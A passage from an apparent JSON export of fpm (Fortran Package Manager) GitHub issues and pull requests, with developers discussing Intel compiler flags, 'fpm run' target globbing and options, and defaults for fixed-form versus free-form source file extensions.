            "text": "This should close #371.\nAfter running\n$fpm new TESTIT --app\n$fpm build --compiler ifort --verbose\n$fpm build --compiler ifort --verbose --release\nyou now get\n$fpm build --compiler ifort --verbose --release\n <INFO>BUILD_NAME:release\n <INFO>COMPILER:  ifort\n <INFO>COMPILER OPTIONS:   -fp-model precise -pc 64 -align all\n                           -error-limit 1 -reentrancy threaded -nogen-interfaces -assume byterecl\n                           -module build/ifort_release/TESTIT -I build/ifort_release/TESTIT\n$fpm build --compiler ifort --verbose --release\n <INFO>BUILD_NAME:debug\n <INFO>COMPILER:  ifort\n <INFO>COMPILER OPTIONS:   -warn all -check:all:noarg_temp_created\n                           -error-limit 1 -O0 -g -assume byterecl -traceback  -module\n                           build/ifort_debug/TESTIT -I build/ifort_debug/TESTIT",
            "comments": []
        },
        {
            "number": 371,
            "user": "awvwgk",
            "date": "2021-02-23 16:12:46+00:00",
            "title": "Intel Fortran release mode uses different calling convention",
            "text": "fpm sets -assume nounderscore if the --release flag is provided, but does not set this option for the default debug build. This means LAPACK / BLAS routines can only be called with Intel in debug mode right now.\n + ifort  -fp-model precise -pc 64 -align all -error-limit 1 -reentrancy threaded -nogen-interfaces -assume byterecl -assume nounderscore  -module build/ifort_release/multicharge -I build/ifort_release/multicharge build/ifort_release/multicharge/app_main.f90.o build/ifort_release/multicharge/libmulticharge.a  -llapack -lblas -llapack -lblas -o build/ifort_release/app/multicharge\nld: build/ifort_release/multicharge/libmulticharge.a(src_multicharge_blas.f90.o): in function `multicharge_blas_mp_mchrg_sgemv312':\nblas.f90:(.text+0x38a): undefined reference to `sgemv'\n...",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-02-23 16:42:01+00:00",
                    "text": "Is this because you're not using a BIND(C) interface or does that not work for you?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-23 17:06:44+00:00",
                    "text": "I never needed a bind(C) for interfacing with Fortran 77 APIs so far, also the linking works with Intel in debug but not with Intel in release, we shouldn't change the calling convention from one build mode to another."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-23 17:08:14+00:00",
                    "text": "Using bind(C) to solve the issue for Intel release would break it for Intel debug and GCC."
                },
                {
                    "user": "LKedward",
                    "date": "2021-02-23 17:33:02+00:00",
                    "text": "I never needed a bind(C) for interfacing with Fortran 77 APIs so far,\n\nApologies, ignore my comment, wasn't thinking"
                },
                {
                    "user": "LKedward",
                    "date": "2021-02-23 17:35:41+00:00",
                    "text": "we shouldn't change the calling convention from one build mode to another\n\nI agree, it looks like -assume nounderscore should be removed from in the release flags as well.\nEdit: wrong way around."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-24 01:10:55+00:00",
                    "text": "I believe --assume nounderscore should be removed from --release version. There were all kinds of issues with underscores with Intel and other vendors long ago; but to my knowledge they were resolved.  I built  a mixed ifort/icc fpm project (M_draw module from GPF) with no issues without it. Perhaps a bigger issue is that the Fortran fpm(1) assumes the compiler name given can handle both Fortran and C, or at least \"co-compiler\" C.  GNU and IBM and a few others do that; but Intel does not so you have to create a shell script called ifort that calls icc if the input file ends in .c right now and put that in your path before the ifort command and call the ifort command in the script with a full pathname, which is an ugly kludge when building  mixed F/C projects right now.  If anyone requires \"-assume nounderscore\" let me know."
                }
            ]
        },
        {
            "number": 370,
            "user": "urbanjost",
            "date": "2021-02-21 02:12:54+00:00",
            "title": "Changed behavior for run subcommand per @LKedwards suggestions",
            "text": "Addresses #245 \ud83d\udc4d per @LKedward and @awvwgk suggestions\nSimplified it as introducing a BRE like M_match.f90 or depending on a C library seemed too much for such a basic feature, so added simple globbing. Only run was changed to not run everything\nby default; not test. Because the code for run and test is contained in a single procedure it does\ncause test to allow globbing for specific test names but that should be a transparent change to test.\nThis adds no new command switches.\nOPTION\n --target NAME(s)  list of specific application names to execute.\n                     No name is required if only one target exists.\n                   If no name is supplied and more than one candidate\n                   exists or a name has no match a list is produced\n                   and fpm(1) exits.\n                     Basic \"globbing\" is supported where \"?\" represents\n                   any single character and \"*\" represents any string.\n                     The special string \".\" causes all targets to\n                   be listed, even if only a single target exists.\n                     The special string \"..\" causes all targets to\n                   be executed.\n\nEXAMPLES\nfpm(1) - run or display project applications:\n  fpm run     # run a target when only one exists or list targets\n  fpm run .   # list all targets, running nothing\n  fpm run ..  # run all targets, no matter how many there are\n  fpm run --example 'demo*' # run example programs starting with \"demo\"\no  I could change my mind about allowing BRE (Basic Regular Expressions) via M_match, as it seems\nslightly odd to quote globbing expressions. On the other hand all CLI systems in common use allow\nglobbing, and not everyone may be familiar with RE  (eg. '.*' would be required instead of '*'.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-03-02 04:14:18+00:00",
                    "text": "removed --all and added special \".\" and \"..\" names  (no shift key or quoting required)."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-03-02 08:31:27+00:00",
                    "text": "(Slightly pedantic and only tangent to the topic :)) The period (.) is a\nmetacharacter in all regular expression engines, not just Pearl's. There\nexists a whole slew of theory on such expressions that predates Pearl. The\norigin of regular expressions is in the field of genetics, IIRC.\n\nOp di 2 mrt. 2021 om 09:14 schreef Sebastian Ehlert <\nnotifications@github.com>:\n\u2026\n ***@***.**** commented on this pull request.\n\n The . is usually used in Perl's RE to match any character. I'm not sure\n if the implicit logic of . and .. is a clear design. I'm fine with the\n logic of having . list all executables, but I don't think we should have\n .. if an shorter equivalent (*) exists.\n\n Personally, I don't have a problem using shift on my keyboard, but this\n might be due to the fact that I'm used to a localized keyboard layout which\n is heavy on alt gr.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#370 (review)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR4PEILBN5G4H5BKBBDTBSNAFANCNFSM4X6PKORA>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-02 08:34:59+00:00",
                    "text": "(Slightly pedantic and only tangent to the topic :)) The period (.) is a metacharacter in all regular expression engines, not just Pearl's\n\nI thought so, but I only know Perl's RE well enough for making such comments ;)."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-02 09:01:20+00:00",
                    "text": "I like the new . and .. special names since they're significantly faster than having to type \"*\". The need to quote * is quite ugly and detracts from its typical and intuitive usage."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-03-02 09:56:52+00:00",
                    "text": "FWIW, I am fine  with the * (unquoted) symbol even if it requires the Shift key. I would also be okay with a more verbose synonym --all.\nI join @awvwgk's concern with the .. symbol. For me it has a strong association with the parent directory in Linux (e.g. ls . and ls ..). In this sense fpm run * feels more in line with \"run anything possible\"."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-03-02 10:00:30+00:00",
                    "text": "How about three periods (ellipsis)? So: fpm run ...\n\nThat definitely does not have the association with directories and in text\nthe ellipsis is a well-known instrument.\n\nOp di 2 mrt. 2021 om 10:57 schreef Ivan Pribec <notifications@github.com>:\n\u2026\n FWIW, I am fine with the * symbol even if it requires Shift (and a more\n verbose synonym --all).\n\n I join @awvwgk <https://github.com/awvwgk>'s concern with the .. symbol.\n For me it has a strong association with the parent directory in Linux (e.g. ls\n . and ls ..). In this sense fpm run * feels more in line with \"run\n anything possible\".\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#370 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7GINMZJORZSVMAPH3TBSY7JANCNFSM4X6PKORA>\n ."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-03-02 10:28:19+00:00",
                    "text": "Personally, I still find * more intuitive than .... Since * is the glob wildcard symbol for \"matching any number of characters\", it makes sense to me it would run all viable targets. But if there are reasons why the asterisk is not suitable, then the ellipsis might be my next favorite choice."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-02 10:43:24+00:00",
                    "text": "But if there are reasons why the asterisk is not suitable...\n\nI don't think the asterisk without quotes is an option since it will be shell-expanded to a listing of the current directory before fpm is invoked.\n\nFair point about .. being associated with the parent directory. My preference would just be for . (not ..) to run all executables or to keep the --all flag. And to list multiple executables just use fpm run or fpm run --list. So no need for .."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-03-02 10:56:44+00:00",
                    "text": "I don't think the asterisk without quotes is an option since it will be shell-expanded to a listing of the current directory before fpm is invoked.\n\nThat explains why ls * lists contents of both the current directory and of any sub-directories. I take my previous comments about the asterisk back."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-02 14:56:43+00:00",
                    "text": "BRE are basic regular expressions.  the M_match.f90 module is a direct descendent of the first public RE engine, which was written in ratfor (Rational Fortran).  It could be used, but not everyone is familiar with RE (especially Windows users). We could introduce a common regular expression library via ISO_C_BINDING which there are a lot of.  The advantage of a regular expression is it is expected to be quoted.  If M_match were used to run all would be\nrun '.*'\nbut that would be adding a good deal of code and people are more familiar with globbing, especially for filenames so I went with globbing even though it would need quoting.\n\".\" and \"..\" were actually picked because they are not a special character and those two particular strings would never be file basenames (which is what run takes as an argument) and they are easy to type.\nSince that allowed for\no listing all the shortnames no matter what number of them there are\no running all the names\no running a list of names\no running groups of names via globbing\no running a single program even if unnamed\no added no new options so was not over-complicating default usage\no specifically did not run multiple programs by default\nSince --list was already taken and full names are required for using the runner command it was also quite useful for\nfpm run --example --list  |grep '^demo'|other_command\nfpm run 'demo*' --example --runner 'other command'\nso maybe starting off making it more like cargo(1) was a mistake if no one likes this; as it gets complicated by the 'if one run, if more list'  logic.    I have been using it and actually liked it.  Apparently that made one.\nCan any users of other package managers tell if it lists choices, gives a menu, ...  cannot tell from cargo documentation exactly what it does when there is more than one choice.  It says it does not run them, but does it list them if so?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-02 15:14:45+00:00",
                    "text": "My 2 cents, I would prefer the following spec:\n\nfpm run is equivalent to fpm run target if there is exactly one target, but is equivalent to fpm run --list otherwise (although I could be convinced it displays an error if there are no targets)\nfpm run --list lists all targets, perhaps displaying an error if there are none, in which case the equivalence holds as stated above\nfpm run target runs all targets that match the glob expression. I rather prefer RE, but that may be because I'm experienced with them. Perhaps glob is sufficient for this case\nfpm run --all runs all targets, thus would be equivalent to fpm run \"*\""
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-02 17:56:49+00:00",
                    "text": "GETS SIMPLER IF --list IS PRETTIER\nThis gets more intuitive if --list  showed something prettier like putting a bad target name in does. I do not use fpm run --list to get the names because it is quite ugly output when you have sixty examples, for instance. So if I got the briefer output I would not mind fpm run --list  especially because I can also now can use expressions for names. Currently, before running anything in someone else's package or in one I cannot remember how many apps or examples or tests I have I run fpm run asdf and get nice output but ugly error messages.\nI sometimes want the long listing --list does now for piping into other commands, although I could use '--runner echo' for that I suppose.  If the default command for --runner was \"echo\" it would do just what --list does now.\nSo does anyone want --list to continue to show long pathnames? I know that would break a few things of mine, but would not be a big deal personally as long as --runner did list the long names.\nAnother option might be to have the list subcommand take options like\nfpm list  --example|--app|--test\nso you could interrogate an unfamiliar package and see all the executables (if any) it generates, for example.\nIf enter something like \"fpm run asdf;fpm run --example asdf;fpm test asdf\" with the current master on some packages\nyou can see something like that might be useful that tells you about a package.  I actually use a bash shell that does that and a tree(1) command on everything but build/ and .git that I like.\nCOULD GO WITH BRE AND STILL STAY PURE FORTRAN\nRegarding Regular Expressions versus Filename Globbing:\nI have been meaning to write a modern Fortran RE library but I was hoping one would show up as an fpm package, as the one I can make public (M_match or M_BRE) is essentially just a modularization of the original ratfor(1) version; but it does work, but only understands BRE (Basic Regular Expressions).\nExpressions need quoting of special characters when invoked from the shell, so one  issue would be RE (which everyone who uses it is used to quoting) has a lot of variants, so not everyone might know Perl RE extensions would not work and so on.\nRE is not nearly as common as globbing, especially outside of the ULS world, and has a significant learning curve; whereas unquoted globbing of filenames in shells if very common in CLI environments; so the only difference would be having to escape/quote the expressions and one relatively simple routine added to fpm.\nCOMBINING THE COMMENTS(Round 2)\nSo changing --list to just show the basename table would allow for\n\n\nfpm run   # run one or list basename table or alternatively leave as in original where all targets are executed\nIf default is to only run one:\n+  fpm run -all  # add back --all as alias for EXPRESSION matching all basenames if default is to only run if there is one target, otherwise this would be the default of fpm run and would not be needed.\n\n\nfpm run [EXPRESSION(s) --list  # list basename table even if one target; ie. only list. This is what it does now, but entire pathnames are listed.  An expression instead of just a list of names would now be allowed.\n\n\nfpm run EXPRESSION(s) # run all targets that match names and expressions. Same as now, except expressions are allowed.\n\n\nremove \".\" or leave it as-is as an undocumented special \"bad name\" that does not produce error messages (so the same as entering fpm run BADNAME except no error message).\n\n\n\nremove \"..\" as it would be the equivalent of other simple commands (depending on above == 'fpm run' or 'fpm run --all' or 'fpm run \"*\"`); although I like it or the ellipsis ... .\n\n\nSo that would act close to most of the descriptions.  Then to recover the lost capability of the current --list add\nofpm run [expressions] --runner # a blank runner command produces long names one per line like --list currently does\nI personally do not like the inconsistency of the \"run if one, list if many\" behavior that run has  versus test and agree test should default to everything; so for the sake of consistency  I would live with fpm run --list with the short basename output and leaving fpm run running everything.\nI can put the BRE code in for people to test with, maybe by using a --regex switch if anyone thinks that is a good idea.\nso for testing something like\nfpm run -regex '^[a-e]'\nwould work."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-03 02:25:47+00:00",
                    "text": "Changes from current master:\n\non run and test the --runner option with no command lists\nlong filenames of the executables. It did nothing useful before\nwhen the command was blank. So this produces the same output\nas --list does in the current master. It also does not echo\nthe executed command unless --verbose is added, instead of\nalways displaying the command.\n--list now shows a short table of the basenames\nrun with no name only runs a program if there is one target,\ninstead of defaulting to running all targets.\nrun has a --all switch which causes all programs to be\nexecuted.\nrun and test target names can be specified with quoted\nglobbing strings.\n\nOPTIONS\n --target NAME(s)  list of application names to execute. No name is\n                   required if only one target exists. If no name is\n                   supplied and more than one candidate exists or a\n                   name has no match a list is produced and fpm(1)\n                   exits.\n                   Basic \"globbing\" is supported where \"?\" represents\n                   any single character and \"*\" represents any string.\n --all   Run all examples or applications. An alias for --target '*'.\n\nEXAMPLES\n  fpm run          # run a target when only one exists or list targets\n  fpm run --example --list # list all targets, running nothing.\n  fpm run --all     # run all targets, no matter how many there are.\n  fpm run --list   # list all targets in a compact table.\n  fpm run --example --runner # list all targets in long format\n  fpm run --example '*bench*'  # run examples with string \"bench\" in their\n                               # basename"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-03 02:52:47+00:00",
                    "text": "so one of the problems was \"fpm run\"  could potentially run dozens of programs, which is usually not (but sometimes) wanted.  That was the desired behavior for \"fpm test\" though. So now all tests are still run by default, but  when no target is named for run nothing is run unless only one target exists (note cargo(1) behaves like this as well). The new --all switch lets you still simply run everthing if you desire.\nAnother problem was that it required inputting an invalid name to get a short list of the available targets. --list now shows this as well instead of the previous long listing which was hard to pick a name from. So now --list is a reasonable way to get a list while being sure nothing will run that is\nnot so verbose that you do not want to use it when there are more than a file targets.\nFor times when you want the long names --runner '' can now be used with no command so no functionality is lost.\nFor in-between the all-or-nothing choices provided by those options you can still provide a list of target names, but you can now use simple globbing (note quoting is required to protect * and ? from shell expansion) .\nSo I think that covers everything except using BRE (Basic Regular Expressions). The target names are so much like filenames which are usually handled with globbing that I thing that REs are unexpected and do not add much for likely matching in this case so sticking with globbing. One advantage of REs is they are usually expected to be quoted, so I could be dissuaded; but my general hunch is \"fpm run '^[a-eA-E].*.[0-90-9]$'\" would not make sense to a significant number of users.\nSUMMARY\nSo if I want to know what is there without running anything I use --list;  I can run a single app (assumed to be a very common case so worth catering to) without using a name; but I am stopped from inadvertently running dozens of apps or tests without using -all or a list; and the list can now be specified with globbing. The --runner option was modified to allow for the lost long filename listing."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-03 13:49:22+00:00",
                    "text": "The current changes nicely address all of the points discussed and so with two approvals I'll merge later today if there are no other comments."
                }
            ]
        },
        {
            "number": 369,
            "user": "LKedward",
            "date": "2021-02-20 13:51:56+00:00",
            "title": "Separate build targets from model structure",
            "text": "As discussed previously the list of build targets (build_target_t) is specific to the native backend and hence doesn't strictly belong in the model structure (which is ideally backend-independent).\nThis PR separates the list of build targets from the model structure and therefore provides a better distinction between the package representation and the fpm backend. In particular this refactoring removes some existing complication and redundancy in the treatment of compiler and linker flags which are now passed to the backend on a per target basis. As a result the backend is further simplified and importantly this paves the way for #112 (managing flags) and #358 (Improve support for include statements).",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-03-06 11:31:38+00:00",
                    "text": "In the long term we should aim for a solution which doesn't require to generates in a context where they are not required, i.e. the installer.\n\nThanks for reviewing, yes I agree with you on this point."
                }
            ]
        },
        {
            "number": 368,
            "user": "certik",
            "date": "2021-02-19 18:05:33+00:00",
            "title": "Support Lapack natively",
            "text": "This is in some sense similar to #354. fpm should have a first class support for Lapack and its fast implementations. Many times you have to enable MKL in Intel with special options based on the Intel compiler version, and so on.\nI don't know exactly what we need to do technically, whether we can design a general mechanism in our package management, or simply hardwire Lapack like we will hardwire MPI.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-03 14:23:40+00:00",
                    "text": "See #330 for a related discussion."
                }
            ]
        },
        {
            "number": 367,
            "user": "certik",
            "date": "2021-02-19 17:48:11+00:00",
            "title": "Options in fpm.toml for free-form / fixed-form selection",
            "text": "I think we need an option to select a default for the whole project, perhaps:\nproject_file_type = \"fixed-form\"\n\nand then we need an option to override the project level setting for a given file.\nSo you could select the whole project to be fixed-form, but can select two files to be free-form. And vice versa.\nThis issue is not about what fpm should do by default (see #366) for that. This issue is simply the mechanics how the free form should be selected. So mostly about syntax.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 18:16:27+00:00",
                    "text": "I would prefer to decide this based on a separate source table rather than a keyword as suggested in #366 (comment)."
                },
                {
                    "user": "certik",
                    "date": "2021-02-19 18:26:15+00:00",
                    "text": "Your source table works based on an extension. What if you are using some legacy code in .f and want to use free-form also in .f? One could rename the legacy code extension."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 18:32:43+00:00",
                    "text": "What if you are using some legacy code in .f and want to use free-form also in .f?\n\nWe should strongly discourage this, decisions like this should be based on per project basis, it would help to bring the point across that we are reclaiming f as extension for free format. The specification of file specific rules will already be incredible lengthy in the package manifest, it's not a clear design, someone might be tempted to automate writing those entries. If one really wants to have to have free and fixed format in the same project, a setup like this might work with a local subproject:\nfpm.toml\nsrc/\nlegacy/\n|-- fpm.toml\n|-- src/"
                }
            ]
        },
        {
            "number": 366,
            "user": "certik",
            "date": "2021-02-19 17:40:26+00:00",
            "title": "Proposal: add an option to select fixed-form, make free-form the default",
            "text": "Proposal:\n\n\nMake fpm treat all Fortran file extensions (.f, .f90, ...) as free-form by default. fpm is responsible for calling each compiler properly with the correct options (so it would tell each compiler to treat it as free-form). Compilers do not need to change at all.\n\n\nfpm will have an option to turn fixed-form for legacy packages (both on per project or per file basis), such as https://github.com/ivan-pi/LINPACK\n\n\nNote: compilers do not need to change. This proposal is strictly what fpm does by default.\nThis proposal will allow people who want to\n\ncontinue using .f for fixed-form to do so (with a simple option in `fpm.toml)\ncontinue using .f90 for free-form to do so (by default)\nstart using .f for free-form to do so (by default)\n\nThis proposal is not about what fpm new does, that would be a separate issue.\nAnother way to look at this is that we need an option to select free-form / fixed-form anyway (see #367). The only question is what should be the default. Because we do not recommend to use fixed-form for new projects, the free-form should be the default, and fixed-form should be selected by an option.\nNote: this issue can be split into two parts:\na) how to select fixed-form and free-form, the syntax and mechanics of it: #367\nb) what should be the project level default (this issue)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 18:14:47+00:00",
                    "text": "I would suggest to add a source entry to the build table (or top-level), there we can decide to add file extensions for all three four supported languages in fpm (Fortran, C, C++ and of course legacy Fortran).\n[build.source]\nfortran = [\"f\", \"f90\"]\nfortran-legacy = [\"ftn\", \"for\"]\nc = [\"c\"]\ncpp = [\"cpp\", \"cc\"]\nThis should provide the overall most flexible design, we only have to decide on reasonable defaults."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-19 20:05:05+00:00",
                    "text": "Doing it by file suffix introduces yet another (customizable) convention, just like compilers did.\nAn alternative is to completely divorce the legacy-modern / fixed-free forms from the source file suffix.\n\nAssume free format for all source files\nAllow customizing which suffixes denote source files. For example, default list for Fortran could be ['f', 'f90', 'f03', 'f08', 'f18', 'ftn'], but the user should be able to add, e.g. 'ff' to the list if they wish so\nHave a project wide legacy = true switch in the manifest to assume fixed-format for all source files\nHave a per-source file specific legacy = true switch in the manifest to assume fixed-format only for some files."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-19 20:23:12+00:00",
                    "text": "An alternative is to completely divorce the legacy-modern / fixed-free forms from the source file suffix.\n\nI really, really like the idea. Still I'm a bit torn, because I'm using a mixed format project as starting point for my teaching next month. The fixed format part is a redistributed version of the dspev solver from LAPACK and the students never interact directly with this file... yet I would have to create a local subproject for just one file here, which does not look particular elegant.\nEdit: Probably could just convert the fixed format to free in this case..."
                },
                {
                    "user": "certik",
                    "date": "2021-02-19 20:49:44+00:00",
                    "text": "@awvwgk your use case is precisely what I had in mind. I think we should allow per file setting also. In other words, perhaps let's do per extension and per file and per project."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-20 01:03:07+00:00",
                    "text": "I agree with the goals and desired behaviors but having gone through this with many suffixes and compilers you want to pick two suffixes.\nAnd even to support .f as a free-format suffix fpm will have to copy the source file to .f90 for some commonly used compilers.\nSo short of only supporting certain compilers pick two suffixes -- .f and .ftn  or .f90 and .f and do not support any others unless it actually means something else like to preprocess it.\nEven if I start with a bunch of legacy code that ends in .for or .ftn It takes one ULS command (rename .old .new *.old) to \"convert\" to any new two-suffix system; so that is not asking much for users to get rid of .f03 and .f08 and such. We tried for a while to use such suffixes to actually connote specific standard conformance but in the long run it was a bad idea. Pick two."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-20 01:15:19+00:00",
                    "text": "I think there's merit to restricting suffixes, as a more \"aggressive\" way to promote a convention. But I don't see a need for two suffixes, only one: .f. Compilers can be told to compile it in free or fixed form."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-23 19:36:55+00:00",
                    "text": "Seems to have gonequiet, but since I read though over a dozen compiler manuals here is my last vote on the issue:\nAfter taking a survey of major compilers looking at supported suffixes that do not contain dates \".for\" comes close for fixed-format but PGI in particular seems to basically only support .f and .f90; but I would hate to have to specify which file is which in the toml file so location rather than suffix seems the easiest to me.\nAssume everything is free-format and ends in \".f\" or \".F\" unless placed in a subdirectory  like fixed/ or f77/ under app/, test/, example/, and src/. Since \"fixed\" is an English word that might be used for other purposes f77/ might be a better choice.  It still would be nice if the Standard supplied guidance, and if vendors allowed lists like  \"-free .f,.f90,.for,.ftn\".\nAs an aside, I did not know GNU allowed \"-x mysuffix  source.mysuffix\" until surveying what was available..  IBM and Intel and GNU all allow for custom suffixes, but it is not clear to me if the options can be specified multiple times.\nSo not my first choice, but looking at the different compilers and wondering what to do about \".cuf\" and noting that the only thing \"standardized\" is \".f\". and \".f90\"  (if supported, the meanings of .f77, .for, .ftn, .ff vary. For the compilers that allow the post-f90 standard-year suffixes like .f03, .f08, ...  at least all those assume free format, as expected ) I would say everything by default should be assumed free-format and should end in \"{.F,.f}\". \"if not now, when?\".\nAll the compilers I looked at had some way of saying the file was free-format or fixed-format regardless of the suffix with a compiler keyword so that is supportable.\nWhether a change is made or not the standard, fortran-lang, and fpm should strongly encourage just the use of {.F, .F90, .f, .f90} except for vendor-specific extensions like .CUF..  So if everything was \".f\" or \".F\" (as @milancurcic suggested) but I could move the file into a subdirectory called deprecated/ or fixed/  (I want to be able to change it with a move, not be editing a config file) I would be good with that.  If in the \"deprecated\" directory .f meant fixed and .f90 meant free I would not mind if the deprecated/ directory was the only place computed GOTO and  source without implicit interfaces were allowed either, but maybe that is too draconian.\nNote  a good number of vendors allow for a pragma-like comment in the source files but it varies from vendor to vendor even when implemented. If that had been done in the standard when free-format was introduced in Fortran90 like\nmodule, free ...::\nsubroutine,free:: name(...\nfunction,free:: name(...\nprogram,free:: name\n\nand then encouraged the use of one suffix (\".f|.F\")  I would have been happier about it. Until an explicit free or fixed specification was encountered you would have to have a default which for upward-compatibility probably would have been \"fixed\" which would mean that now-a days everyone would be complaining about having to specify \"free\" just like is heard about \"implicit none\" but it would have been better than the current state in my opinion.\nThen there are all tweaks to make for other programs like make(1) and editor syntax highlighting and ...\nI guess this was such a big change a file suffix was the easiest way to distinguish them, but C did not end up with \".c89\" and such; although I dimly do seem to remember using that for some C compiler once upon a time. Of course the battle over suffixes greater than three characters still seems to be ongoing (eg. \".htm\" versus \".html\") in some quarters."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-24 11:21:48+00:00",
                    "text": "Assume everything is free-format and ends in \".f\" or \".F\" unless placed in a subdirectory like fixed/ or f77/ under app/, test/, example/, and src/. Since \"fixed\" is an English word that might be used for other purposes f77/ might be a better choice. It still would be nice if the Standard supplied guidance, and if vendors allowed lists like \"-free .f,.f90,.for,.ftn\".\n\nWhy not legacy/ instead of fixed/? The latter is more specific but I think the former explains better the rationale behind the potential new default of fpm.\n\nSo not my first choice, but looking at the different compilers and wondering what to do about \".cuf\" and noting that the only thing \"standardized\" is \".f\". and \".f90\" (if supported, the meanings of .f77, .for, .ftn, .ff vary. For the compilers that allow the post-f90 standard-year suffixes like .f03, .f08, ... at least all those assume free format, as expected ) I would say everything by default should be assumed free-format and should end in \"{.F,.f}\". \"if not now, when?\".\n\nI entirely agree.\n\nWhether a change is made or not the standard, fortran-lang, and fpm should strongly encourage just the use of {.F, .F90, .f, .f90} except for vendor-specific extensions like .CUF.. So if everything was \".f\" or \".F\" (as @milancurcic suggested) but I could move the file into a subdirectory called deprecated/ or fixed/ (I want to be able to change it with a move, not be editing a config file) I would be good with that. If in the \"deprecated\" directory .f meant fixed and .f90 meant free I would not mind if the deprecated/ directory was the only place computed GOTO and source without implicit interfaces were allowed either, but maybe that is too draconian.\n\nThis is what I have proposed in the \"originator\" issue. Let's discuss the suitability of such \"draconian\" rules there. Maybe we can find a way to make everyone happy without pushing it too much."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-24 14:12:05+00:00",
                    "text": "Why not legacy/ instead of fixed/? The latter is more specific but I think the former explains better the rationale behind the potential new default of fpm.\n\nAccording to the article \"Defining Legacy Code\" there is no clear consensus among developers what legacy means. Even the reference LAPACK continues to be written in an old style of Fortran but is in widespread use (or at least the vendor versions are).\nThere is also the opinion of Bjarne Stroustrup (creator of C++):\n\n\"Legacy code\" often differs from its suggested alternative by actually working and scaling.\n\n\nInterestingly, in MFE I could not find any paragraph about conventions with file extensions (presumably, because they are not stated by the standard).\nThe book by Chirila & Lohmann contains the footnote:\n\nFiles containing modern Fortran source code usually have the extension .f90, but the reader may also encounter extensions .f77, .f, or .for, which correspond to older standards; likewise, some  developers  may  use  the  extensions .f95, .f03, or .f08,  to  highlight  use  of  features present in the latest revisions of the language\u2014but this practice is discouraged by some authors (e.g. Lionel [2]). To avoid problems, filenames should also not contain whitespace.\n\nMilan's new book also recommends sticking to .f90 for consistency.\nWhat I am trying to point out, is that newcomers to the language might be confused by any default fpm conventions, which differ from written resources, what they learn at university, web-pages, etc."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-24 14:26:08+00:00",
                    "text": "Whether a change is made or not the standard, fortran-lang, and fpm should strongly encourage just the use of {.F, .F90, .f, .f90} except for vendor-specific extensions like .CUF.. So if everything was \".f\" or \".F\" (as @milancurcic suggested) but I could move the file into a subdirectory called deprecated/ or fixed/ (I want to be able to change it with a move, not be editing a config file) I would be good with that. If in the \"deprecated\" directory .f meant fixed and .f90 meant free I would not mind if the deprecated/ directory was the only place computed GOTO and source without implicit interfaces were allowed either, but maybe that is too draconian.\n\nThis is what I have proposed in the \"originator\" issue. Let's discuss the suitability of such \"draconian\" rules there. Maybe we can find a way to make everyone happy without pushing it too much.\n\nI don't like the idea of a deprecated/ folder tied to language features. For example the Fortran 2018 standard made the forall statetement obsolescent. Would \"good programming practice\" dictate I should move all my free-form F95+ programs containing the forall construct into a different folder? I don't think so."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-24 14:35:46+00:00",
                    "text": "After taking a survey of major compilers looking at supported suffixes that do not contain dates \".for\" comes close for fixed-format but PGI in particular seems to basically only support .f and .f90; but I would hate to have to specify which file is which in the toml file so location rather than suffix seems the easiest to me.\n\nI tried to summarize the existing defaults for file extensions and the fixed-/free- compiler flags in issue #250. Please feel free to add any I might have missed."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-24 15:03:05+00:00",
                    "text": "@ivan-pi wrote:\n\nWhat I am trying to point out, is that newcomers to the language might be confused by any default fpm conventions, which differ from written resources, what they learn at university, web-pages, etc.\n\nI agree that there is the risk of an initial confusion, I've already mentioned this elsewhere. However, I'd bet most of the books and written resources (except rare examples like fortran-lang.org) have no reference to fpm or stdlib. As a rethorical question: should we then scrap fpm and stdlib too? Obviously not."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-24 15:13:20+00:00",
                    "text": "Yes, this discussion is meaningful only in the context of fpm.\nSo pointing to recommendations that are not fpm-aware, or prior to fpm, while useful to be aware of, are not relevant because they simply reiterate what major compilers use as default.\nRecall that this is not about trying to change the culture or conventions head on. This is about asking, \"if we are not tied to any past convention, what is the most sensible default for fpm?\". Whatever the answer is, use that for fpm, make fpm ubiquitous in the Fortran library ecosystem (it will take years, but it's feasible), and let users decide for themselves what suffix to use.\nFpm will eventually be no less significant tool than any major compiler."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-24 15:16:21+00:00",
